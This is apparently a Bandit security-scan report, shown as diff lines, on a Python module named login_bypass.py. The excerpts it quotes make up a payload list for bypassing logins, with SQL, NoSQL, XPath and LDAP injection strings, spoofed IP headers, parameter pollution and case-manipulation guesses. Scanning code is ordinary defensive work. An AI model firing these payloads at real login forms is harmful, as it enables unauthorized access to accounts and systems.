+159	            {"username": "1' OR 1=1#", "password": "1' OR 1=1#", "type": "sqli"},
+160	            {"username": "admin'--", "password": "admin'--", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'admin'--'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:160:37
+159	            {"username": "1' OR 1=1#", "password": "1' OR 1=1#", "type": "sqli"},
+160	            {"username": "admin'--", "password": "admin'--", "type": "sqli"},
+161	            {"username": "admin'#", "password": "admin'#", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'admin'#'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:161:36
+160	            {"username": "admin'--", "password": "admin'--", "type": "sqli"},
+161	            {"username": "admin'#", "password": "admin'#", "type": "sqli"},
+162	            {"username": "' OR '1'='1' --", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:162:44
+161	            {"username": "admin'#", "password": "admin'#", "type": "sqli"},
+162	            {"username": "' OR '1'='1' --", "password": "password", "type": "sqli"},
+163	            {"username": "' OR '1'='1' #", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:163:43
+162	            {"username": "' OR '1'='1' --", "password": "password", "type": "sqli"},
+163	            {"username": "' OR '1'='1' #", "password": "password", "type": "sqli"},
+164	            {"username": "') OR '1'='1--", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:164:43
+163	            {"username": "' OR '1'='1' #", "password": "password", "type": "sqli"},
+164	            {"username": "') OR '1'='1--", "password": "password", "type": "sqli"},
+165	            {"username": "') OR '1'='1#", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:165:42
+164	            {"username": "') OR '1'='1--", "password": "password", "type": "sqli"},
+165	            {"username": "') OR '1'='1#", "password": "password", "type": "sqli"},
+166	            {"username": "1' AND 1=1--", "password": "1' AND 1=1--", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '1' AND 1=1--'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:166:41
+165	            {"username": "') OR '1'='1#", "password": "password", "type": "sqli"},
+166	            {"username": "1' AND 1=1--", "password": "1' AND 1=1--", "type": "sqli"},
+167	            {"username": "1' AND 1=2--", "password": "1' AND 1=2--", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '1' AND 1=2--'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:167:41
+166	            {"username": "1' AND 1=1--", "password": "1' AND 1=1--", "type": "sqli"},
+167	            {"username": "1' AND 1=2--", "password": "1' AND 1=2--", "type": "sqli"},
+168	        ]
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$ne': ''}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:173:40
+172	        nosql_payloads = [
+173	            {"username": "{'$ne': ''}", "password": "{'$ne': ''}", "type": "nosql"},
+174	            {"username": "{'$gt': ''}", "password": "{'$gt': ''}", "type": "nosql"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$gt': ''}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:174:40
+173	            {"username": "{'$ne': ''}", "password": "{'$ne': ''}", "type": "nosql"},
+174	            {"username": "{'$gt': ''}", "password": "{'$gt': ''}", "type": "nosql"},
+175	            {
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$regex': '.*'}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:177:16
+176	                "username": "{'$regex': '.*'}",
+177	                "password": "{'$regex': '.*'}",
+178	                "type": "nosql",
+179	            },
+180	            {
+181	                "username": "{'$exists': true}",
+182	                "password": "{'$exists': true}",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$exists': true}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:182:16
+181	                "username": "{'$exists': true}",
+182	                "password": "{'$exists': true}",
+183	                "type": "nosql",
+184	            },
+185	            {"username": "{'$ne': null}", "password": "{'$ne': null}", "type": "nosql"},
+186	            {"username": "{'$ne': []}", "password": "{'$ne': []}", "type": "nosql"},
+187	            {
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$ne': null}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:185:42
+184	            },
+185	            {"username": "{'$ne': null}", "password": "{'$ne': null}", "type": "nosql"},
+186	            {"username": "{'$ne': []}", "password": "{'$ne': []}", "type": "nosql"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$ne': []}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:186:40
+185	            {"username": "{'$ne': null}", "password": "{'$ne': null}", "type": "nosql"},
+186	            {"username": "{'$ne': []}", "password": "{'$ne': []}", "type": "nosql"},
+187	            {
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$not': {'$eq': ''}}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:189:16
+188	                "username": "{'$not': {'$eq': ''}}",
+189	                "password": "{'$not': {'$eq': ''}}",
+190	                "type": "nosql",
+191	            },
+192	            {
+193	                "username": "{'$in': ['admin']}",
+194	                "password": "{'$in': ['admin']}",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$in': ['admin']}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:194:16
+193	                "username": "{'$in': ['admin']}",
+194	                "password": "{'$in': ['admin']}",
+195	                "type": "nosql",
+196	            },
+197	            {
+198	                "username": "{'$or': [{'username': 'admin'}, {'username': 'guest'}]}",
+199	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:199:16
+198	                "username": "{'$or': [{'username': 'admin'}, {'username': 'guest'}]}",
+199	                "password": "password",
+200	                "type": "nosql",
+201	            },
+202	            {
+203	                "username": "{'$where': '1==1'}",
+204	                "password": "{'$where': '1==1'}",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '{'$where': '1==1'}'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:204:16
+203	                "username": "{'$where': '1==1'}",
+204	                "password": "{'$where': '1==1'}",
+205	                "type": "nosql",
+206	            },
+207	        ]
+208	        payloads.extend(nosql_payloads)
+209	
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '' or '1'='1'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:212:40
+211	        xpath_payloads = [
+212	            {"username": "' or '1'='1", "password": "' or '1'='1", "type": "xpath"},
+213	            {
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:215:16
+214	                "username": "' or '1'='1' or '1'='1",
+215	                "password": "password",
+216	                "type": "xpath",
+217	            },
+218	            {"username": "' and '1'='1", "password": "' and '1'='1", "type": "xpath"},
+219	            {"username": "' and '1'='2", "password": "' and '1'='2", "type": "xpath"},
+220	            {"username": "admin' or '1'='1", "password": "password", "type": "xpath"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '' and '1'='1'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:218:41
+217	            },
+218	            {"username": "' and '1'='1", "password": "' and '1'='1", "type": "xpath"},
+219	            {"username": "' and '1'='2", "password": "' and '1'='2", "type": "xpath"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '' and '1'='2'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:219:41
+218	            {"username": "' and '1'='1", "password": "' and '1'='1", "type": "xpath"},
+219	            {"username": "' and '1'='2", "password": "' and '1'='2", "type": "xpath"},
+220	            {"username": "admin' or '1'='1", "password": "password", "type": "xpath"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:220:45
+219	            {"username": "' and '1'='2", "password": "' and '1'='2", "type": "xpath"},
+220	            {"username": "admin' or '1'='1", "password": "password", "type": "xpath"},
+221	            {"username": "admin' and '1'='1", "password": "password", "type": "xpath"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:221:46
+220	            {"username": "admin' or '1'='1", "password": "password", "type": "xpath"},
+221	            {"username": "admin' and '1'='1", "password": "password", "type": "xpath"},
+222	        ]
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '*)(&'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:227:33
+226	        ldap_payloads = [
+227	            {"username": "*)(&", "password": "*)(&", "type": "ldap"},
+228	            {"username": "*)(|(&", "password": "*)(|(&", "type": "ldap"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '*)(|(&'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:228:35
+227	            {"username": "*)(&", "password": "*)(&", "type": "ldap"},
+228	            {"username": "*)(|(&", "password": "*)(|(&", "type": "ldap"},
+229	            {"username": "admin*", "password": "admin*", "type": "ldap"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'admin*'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:229:35
+228	            {"username": "*)(|(&", "password": "*)(|(&", "type": "ldap"},
+229	            {"username": "admin*", "password": "admin*", "type": "ldap"},
+230	            {"username": "*)(uid=*)", "password": "*)(uid=*)", "type": "ldap"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '*)(uid=*)'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:230:38
+229	            {"username": "admin*", "password": "admin*", "type": "ldap"},
+230	            {"username": "*)(uid=*)", "password": "*)(uid=*)", "type": "ldap"},
+231	            {"username": "*)(|(uid=*))", "password": "*)(|(uid=*))", "type": "ldap"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '*)(|(uid=*))'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:231:41
+230	            {"username": "*)(uid=*)", "password": "*)(uid=*)", "type": "ldap"},
+231	            {"username": "*)(|(uid=*))", "password": "*)(|(uid=*))", "type": "ldap"},
+232	            {"username": "*)(&(uid=*))", "password": "*)(&(uid=*))", "type": "ldap"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '*)(&(uid=*))'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:232:41
+231	            {"username": "*)(|(uid=*))", "password": "*)(|(uid=*))", "type": "ldap"},
+232	            {"username": "*)(&(uid=*))", "password": "*)(&(uid=*))", "type": "ldap"},
+233	            {
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:235:16
+234	                "username": "*)(|(username=admin))",
+235	                "password": "password",
+236	                "type": "ldap",
+237	            },
+238	        ]
+239	        payloads.extend(ldap_payloads)
+240	
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:245:16
+244	                "username": "admin",
+245	                "password": "password",
+246	                "type": "header_injection",
+247	                "headers": {"X-Forwarded-For": "127.0.0.1"},
+248	            },
+249	            {
+250	                "username": "admin",
+251	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:251:16
+250	                "username": "admin",
+251	                "password": "password",
+252	                "type": "header_injection",
+253	                "headers": {"X-Real-IP": "127.0.0.1"},
+254	            },
+255	            {
+256	                "username": "admin",
+257	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:257:16
+256	                "username": "admin",
+257	                "password": "password",
+258	                "type": "header_injection",
+259	                "headers": {"X-Originating-IP": "127.0.0.1"},
+260	            },
+261	            {
+262	                "username": "admin",
+263	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:263:16
+262	                "username": "admin",
+263	                "password": "password",
+264	                "type": "header_injection",
+265	                "headers": {"X-Client-IP": "127.0.0.1"},
+266	            },
+267	            {
+268	                "username": "admin",
+269	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:269:16
+268	                "username": "admin",
+269	                "password": "password",
+270	                "type": "header_injection",
+271	                "headers": {"X-Remote-IP": "127.0.0.1"},
+272	            },
+273	            {
+274	                "username": "admin",
+275	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:275:16
+274	                "username": "admin",
+275	                "password": "password",
+276	                "type": "header_injection",
+277	                "headers": {"X-Forwarded-Host": "localhost"},
+278	            },
+279	            {
+280	                "username": "admin",
+281	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:281:16
+280	                "username": "admin",
+281	                "password": "password",
+282	                "type": "header_injection",
+283	                "headers": {"X-Forwarded-Proto": "https"},
+284	            },
+285	            {
+286	                "username": "admin",
+287	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:287:16
+286	                "username": "admin",
+287	                "password": "password",
+288	                "type": "header_injection",
+289	                "headers": {"X-Forwarded-Port": "443"},
+290	            },
+291	        ]
+292	        payloads.extend(header_payloads)
+293	
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:298:16
+297	                "username": "admin",
+298	                "password": "password",
+299	                "type": "param_pollution",
+300	                "pollution": "&username=admin&password=password",
+301	            },
+302	            {
+303	                "username": "admin",
+304	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:304:16
+303	                "username": "admin",
+304	                "password": "password",
+305	                "type": "param_pollution",
+306	                "pollution": "&user=admin&pass=password",
+307	            },
+308	            {
+309	                "username": "admin",
+310	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:310:16
+309	                "username": "admin",
+310	                "password": "password",
+311	                "type": "param_pollution",
+312	                "pollution": "&login=admin&pwd=password",
+313	            },
+314	            {
+315	                "username": "admin",
+316	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:316:16
+315	                "username": "admin",
+316	                "password": "password",
+317	                "type": "param_pollution",
+318	                "pollution": "&email=admin@example.com&password=password",
+319	            },
+320	        ]
+321	        payloads.extend(pollution_payloads)
+322	
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'PaSsWoRd'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:325:34
+324	        case_payloads = [
+325	            {"username": "AdMiN", "password": "PaSsWoRd", "type": "case_manipulation"},
+326	            {"username": "admin", "password": "PaSsWoRd", "type": "case_manipulation"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'PaSsWoRd'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:326:34
+325	            {"username": "AdMiN", "password": "PaSsWoRd", "type": "case_manipulation"},
+326	            {"username": "admin", "password": "PaSsWoRd", "type": "case_manipulation"},
+327	            {"username": "AdMiN", "password": "password", "type": "case_manipulation"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:327:34
+326	            {"username": "admin", "password": "PaSsWoRd", "type": "case_manipulation"},
+327	            {"username": "AdMiN", "password": "password", "type": "case_manipulation"},
+328	            {"username": "ADMIN", "password": "PASSWORD", "type": "case_manipulation"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'PASSWORD'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:328:34
+327	            {"username": "AdMiN", "password": "password", "type": "case_manipulation"},
+328	            {"username": "ADMIN", "password": "PASSWORD", "type": "case_manipulation"},
+329	            {"username": "admin", "password": "PASSWORD", "type": "case_manipulation"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'PASSWORD'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:329:34
+328	            {"username": "ADMIN", "password": "PASSWORD", "type": "case_manipulation"},
+329	            {"username": "admin", "password": "PASSWORD", "type": "case_manipulation"},
+330	            {"username": "Admin", "password": "Password", "type": "case_manipulation"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'Password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:330:34
+329	            {"username": "admin", "password": "PASSWORD", "type": "case_manipulation"},
+330	            {"username": "Admin", "password": "Password", "type": "case_manipulation"},
+331	        ]
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '' OR '1'='1'
